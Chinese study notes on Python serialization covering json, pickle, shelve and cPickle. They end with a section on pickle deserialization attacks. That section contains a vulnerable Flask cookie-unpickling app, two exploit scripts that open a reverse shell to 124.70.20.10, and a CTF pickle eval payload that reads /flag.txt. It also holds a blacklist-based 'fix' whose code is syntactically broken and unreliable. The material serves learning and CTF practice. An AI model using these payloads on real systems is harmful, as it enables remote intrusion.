#### python序列化和反序列化

序列化&反序列化：内存中的数据类型---->序列化---->特定的格式（json格式或者pickle格式），内存中的数据类型<----反序列化<----特定的格式（json格式或者pickle格式）

```python
#	序列化得到结果=>特定的格式的内容有两种用途：
1、可用于存储=》用于存档
2、传输给其他平台使用=》跨平台数据交互
```

| 模块名称   | 描述                                       | 提供的api                        |
| ------ | ---------------------------------------- | ----------------------------- |
| json   | 用于实现Python数据类型与通用（json）字符串之间的转换          | dumps()、dump()、loads()、load() |
| pickle | 用于实现Python数据类型与Python特定二进制格式之间的转换        | dumps()、dump()、loads()、load() |
| shelve | 专门用于将Python数据类型的数据持久化到磁盘，shelve是一个类似dict的对象，操作十分便捷 | open()                        |

| 模块名称 | 1                          | 提供的api         |
| -------- | -------------------------- | ----------------- |
| cPickle  | 提供了一个更快速简单的接口 | dump，load，dumps |



#### json

json格式里面字符串必须用双引号

##### Python转JSON

| Python                                 | JSON    |
| -------------------------------------- | ------- |
| dict                                   | Object  |
| list, tuple                            | array   |
| str                                    | string  |
| int, float, int- & float-derived Enums | numbers |
| True                                   | true    |
| False                                  | false   |
| None                                   | null    |

##### JSON转Python

| JSON         | Python |
| ------------ | ------ |
| object       | dict   |
| array        | list   |
| string       | str    |
| number(int)  | int    |
| number(real) | float  |
| true         | True   |
| false        | False  |
| null         | None   |

说明：

- Python dict中的非字符串key被转换成JSON字符串时都会被转换为小写字符串；
- Python中的tuple，在序列化时会被转换为array，但是反序列化时，array会被转化为list；
- 由以上两点可知，当Python对象中包含tuple数据或者包含dict，且dict中存在非字符串的key时，反序列化后得到的结果与原来的Python对象是不一致的；
- 对于Python内置的数据类型（如：str, unicode, int, float, bool, None, list, tuple, dict）json模块可以直接进行序列化/反序列化处理；对于自定义类的对象进行序列化和反序列化时，需要我们自己定义一个方法来完成定义object和dict之间进行转化。

Python的JSON模块 序列化与反序列化的过程分别叫做：encoding 和 decoding。

- **encoding：** 把Python对象转换成JSON字符串
- **decoding：** 把JSON字符串转换成python对象

~~~python
# 序列化：将Python对象转换成json字符串
dumps(obj, skipkeys=False, ensure_ascii=True, check_circular=True, allow_nan=True, cls=None, indent=None, separators=None, default=None, sort_keys=False, **kw)

# 反序列化：将json字符串转换成Python对象
loads(s, encoding=None, cls=None, object_hook=None, parse_float=None, parse_int=None, parse_constant=None, object_pairs_hook=None, **kw)
~~~

除此之外，json模块还提供了两个额外的方法允许我们直接将序列化后得到的json数据保存到文件中，以及直接读取文件中的json数据进行反序列化操作：

~~~python
# 序列化：将Python对象转换成json字符串并存储到文件中
dump(obj, fp, skipkeys=False, ensure_ascii=True, check_circular=True, allow_nan=True, cls=None, indent=None, separators=None, default=None, sort_keys=False, **kw)

# 反序列化：读取指定文件中的json字符串并转换成Python对象
load(fp, cls=None, object_hook=None, parse_float=None, parse_int=None, parse_constant=None, object_pairs_hook=None, **kw)
~~~

**sort_keys参数：** 表示序列化时是否对dict的key进行排序（dict默认是无序的）

**indent参数：** 表示缩进的意思，它可以使得数据存储的格式变得更加优雅、可读性更强；如果indent是一个非负整数或字符串，则JSON array元素和object成员将会被以相应的缩进级别进行打印输出；如果indent是0或负数或空字符串，则将只会插入换行，不会有缩进。

**separators参数：** 尽管indent参数可以使得数据存储的格式变得更加优雅、可读性更强，但是那是通过添加一些冗余的空白字符进行填充的。当json被用于网络数据通信时，应该尽可能的减少无用的数据传输，这样可以节省带宽并加快数据传输速度。json模块序列化Python对象后得到的json字符串中的','号和':'号分隔符后默认都会附加一个空白字符，我们可以通过separators参数重新指定分隔符，从而去除无用的空白字符；

- 该参数的值应该是一个tuple(item_separator, key_separator)
- 如果indent是None，其默认值为(', ', ': ')
- 如果indent不为None，则默认值为(',', ': ')
- 我们可以通过为separator赋值为(',', ':')来消除空白字符

**ensure_ascii参数：** 当该参数的值为True（默认值）时，输出中的所有非ASCII字符（比如中文）都会被转义成'\uXXXX'组成的序列，得到的结果是一个完全由ASCII字符组成的str实例。如果我们想得到一个人类可读的输出结果，需要把ensure_ascii参数的值设置为False。

~~~python
import json
# 序列化
json_res=json.dumps([1,'aaa',True,False])
print(json_res,type(json_res))
~~~

~~~
import json
# 序列化
json_res=json.dumps([1,'aaa',True,False])
# print(json_res,type(json_res))

# 反序列化
l=json.loads(json_res)
print(l,type(l))
~~~

~~~python
import json

# 序列化的结果写入文件的复杂方法
json_res=json.dumps([1,'aaa',True,False])
# print(json_res,type(json_res)) # "[1, "aaa", true, false]"
with open('test.json',mode='wt',encoding='utf-8') as f:
    f.write(json_res)

# 将序列化的结果写入文件的简单方法
with open('test.json',mode='wt',encoding='utf-8') as f:
    json.dump([1,'aaa',True,False],f)
    
# 从文件读取json格式的字符串进行反序列化操作的复杂方法
with open('test.json',mode='rt',encoding='utf-8') as f:
    json_res=f.read()
    l=json.loads(json_res)
    print(l,type(l))

# 从文件读取json格式的字符串进行反序列化操作的简单方法
with open('test.json',mode='rt',encoding='utf-8') as f:
    l=json.load(f)
    print(l,type(l))
~~~

json是支持所有语言通用的数据类型，比如集合这种就无法使用json里面的dumps和loads

##### 猴子补丁

入口处导入的是json，只是把json的loads和dumps换成了ujson的loads和dumps，但是json中的其他部分并没有替换



#### pickle

pickle模块实现了用于对Python对象结构进行 序列化 和 反序列化 的二进制协议，与json模块不同的是pickle模块序列化和反序列化的过程分别叫做 pickling 和 unpickling：

- **pickling：** 是将Python对象转换为字节流的过程；
- **unpickling：** 是将字节流二进制文件或字节对象转换回Python对象的过程；

pickle模块虽然和json模块在序列化和反序列化上基本相同，但是在针对某些数据类型，比如集合类型，pickle模块会将集合类型转化为bytes类型

[![b8NkxU.png](https://s4.ax1x.com/2022/03/02/b8NkxU.png)](https://imgtu.com/i/b8NkxU)



#### shelve

shelve只有一个open()函数，这个函数用于打开指定的文件（一个持久的字典），然后返回一个shelf对象

~~~python
open(filename, flag='c', protocol=None, writeback=False)
~~~

**flag** 参数表示打开数据存储文件的格式，可取值与`dbm.open()`函数一致：

| 值    | 描述                        |
| ---- | ------------------------- |
| 'r'  | 以只读模式打开一个已经存在的数据存储文件      |
| 'w'  | 以读写模式打开一个已经存在的数据存储文件      |
| 'c'  | 以读写模式打开一个数据存储文件，如果不存在则创建  |
| 'n'  | 总是创建一个新的、空数据存储文件，并以读写模式打开 |

**protocol** 参数表示序列化数据所使用的协议版本，默认是pickle v3；

**writeback** 参数表示是否开启回写功能。

~~~python
# 保存数据
with shelve.open('student') as db:
    db['name'] = 'Tom'
    db['age'] = 19
    db['hobby'] = ['篮球', '看电影', '弹吉他']
    db['other_info'] = {'sno': 1, 'addr': 'xxxx'}

# 读取数据
with shelve.open('student') as db:
    for key,value in db.items():
        print(key, ': ', value)

~~~

-------------------

~~~
name :  Tom
age :  19
hobby :  ['篮球', '看电影', '弹吉他']
other_info :  {'sno': 1, 'addr': 'xxxx'}

~~~



~~~python
# 自定义class
class Student(object):
    def __init__(self, name, age, sno):
        self.name = name
        self.age = age
        self.sno = sno
    
    def __repr__(self):
        return 'Student [name: %s, age: %d, sno: %d]' % (self.name, self.age, self.sno)

# 保存数据
tom = Student('Tom', 19, 1)
jerry = Student('Jerry', 17, 2)

with shelve.open("stu.db") as db:
    db['Tom'] = tom
    db['Jerry'] = jerry

# 读取数据
with shelve.open("stu.db") as db:
    print(db['Tom'])
    print(db['Jerry'])

~~~

-----------------------

~~~python
Student [name: Tom, age: 19, sno: 1]
Student [name: Jerry, age: 17, sno: 2]
~~~

#### cPickle

~~~python
1、dump： 将python对象序列化保存到本地的文件

import cPickle
data = range(1000)
cPickle.dump(data,open("test\\data.pkl","wb"))

dump函数需要指定两个参数，第一个是需要序列化的python对象名称，第二个是本地的文件，需要注意的是，在这里需要使用open函数打开一个文件，并指定“写”操作

2、load:载入本地文件，恢复python对象

data = cPickle.load(open("test\\data.pkl","rb"))

3、dumps:将python对象序列化保存到一个字符串变量中
    
data_string = cPickle.dumps(data)    
~~~



#### Python反序列化漏洞

~~~python
成因：当传入了不安全的反序列化函数的内容，就会产生反序列化漏洞，造成任意代码执行。
通常出现在解析认证token，session的时，flask配合redis在服务端存储session的情景

这里的session是被pickle序列化进行存储的，如果你通过cookie进行请求session-id的话，session中的内容就会被反序列化，看似好像是没有什么问题。因为session是存储在服务端的，但是终究是抵不住redis的未授权访问，如果出现未授权的话，我们就能通过set设置自己的session，然后通过设置cookie去请求session的过程中我们自定的内容就会被反序列化，然后我们就达到了执行任意命令或者任意代码的目的

简单来说，就是利用redis的未授权访问，我们可以设置自己的session(经过你的特殊处理)，并通过cookie去调用这个session就会导致任意代码执行
~~~

##### Python unpickle 造成任意命令执行漏洞

web端源码：

~~~python
import pickle
import base64
from flask import Flask, request

app = Flask(__name__)

@app.route("/")
def index():
    try:
        user = base64.b64decode(request.cookies.get('user'))
        user = pickle.loads(user)
        username = user["username"]
    except:
        username = "Guest"

    return "Hello %s" % username

if __name__ == "__main__":
    app.run()
~~~

~~~python
username是取Cookie变量user，对其进行base64解码+反序列化后还原的对象中的“username”变量，默认为“Guest”
~~~

~~~python
#!/usr/bin/env python3
import requests
import pickle
import os
import base64


class exp(object):
    def __reduce__(self):
        s = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("124.70.20.10",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'"""
        return os.system, (s,)


e = exp()
s = pickle.dumps(e)

response = requests.get("http://127.0.0.1:5000/", cookies=dict(
    user=base64.b64encode(s).decode()
))
~~~

EXP

~~~python
#!/usr/bin/env python3
import requests
import pickle
import os
import base64


class exp(object):
    def __reduce__(self):
        s = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("124.70.20.10",50050));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'"""
        return os.system, (s,)


e = exp()
s = pickle.dumps(e)

response = requests.get("http://127.0.0.1:5000/", cookies=dict(
    user=base64.b64encode(s).decode()
))
~~~

###### 修复方法：

通过添加沙盒限制函数执行来修复python反序列化漏洞，修复后的代码如下：

~~~python
from flask import Flask, request

from cStringIO import StringIO
import random
import string
import base64
import os
import sys
import subprocess
import commands
import pickle
import cPickle
import marshal
import os.path
import filecmp
import glob
import linecache
import shutil
import dircache
import io
import timeit
import popen2
import code
import codeop
import pty
import posixfile

black_type_list = [eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen]

app = Flask(__name__)

@app.route("/")
def index():
    try:
        user = base64.b64decode(request.cookies.get('user'))
    user = load(use)
        user = pickle.loads(user)
        username = user["username"]
    except:
        username = "Guest"

    return "Hello %s" % username

def _hook_call(func):
    def wrapper(*args,**kwargs):
        print args[0].stack
        if args[0].stack[-2] in black_type_list:
            raise FilterException(args[0].stack[-2])
        return func(*args,**kwargs)
    return wrapper

def loads(str):
    file = StringIO(str)
    unpkler = Unpkler(file)
    unpkler.dispatch[REDUCE] = _hook_call(unpkler.dispatch[REDUCE])
    return unpkler.load()



if __name__ == "__main__":
    app.run()
~~~



##### [CISCN2019 华北赛区 Day1 Web2]ikun

[地址](https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2]ikun)

~~~python
import requests

for i in range(1,200):
    url = f"http://069c9d7a-5631-41ed-9c9e-3b45a3d7c882.node4.buuoj.cn:81/shop?page={i}"
    b = requests.get(url=url)
    if 'lv6.png' in b.text:
        print(i)
#	181
~~~

jwt爆破出密钥：1Kun

exp

~~~python
import pickle
import urllib

class payload(object):
    def __reduce__(self):
       return (eval, ("open('/flag.txt','r').read()",))

a = pickle.dumps(payload())
a = urllib.quote(a)
print a
~~~























